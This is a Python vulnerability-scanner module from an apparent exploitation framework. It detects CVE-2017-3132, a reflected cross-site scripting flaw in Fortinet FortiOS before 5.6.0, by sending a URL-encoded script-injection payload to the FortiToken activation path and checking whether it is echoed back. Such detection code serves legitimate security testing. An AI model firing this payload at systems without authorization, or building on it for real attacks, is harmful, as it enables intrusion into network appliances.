#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A Cross-Site Scripting vulnerability in Fortinet FortiOS versions 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Fortinet FortiOS < 5.6.0 - Cross-Site Scripting Detection',
        'description': 'A Cross-Site Scripting vulnerability in Fortinet FortiOS versions 5.6.0 and earlier allows attackers to Execute unauthorized code or commands via the action input during the activation of a FortiToken.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'fortinet', 'fortios', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://www.exploit-db.com/exploits/42388', 'https://nvd.nist.gov/vuln/detail/CVE-2017-3132'],
        'cve': 'CVE-2017-3132',
    }

    def run(self):
        path = '/p/user/ftoken/activate/user/guest/?action=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_any = ("var action = '</script><script>alert(document.domain)</script><script>",)
        ctype_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='Fortinet FortiOS < 5.6.0 - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

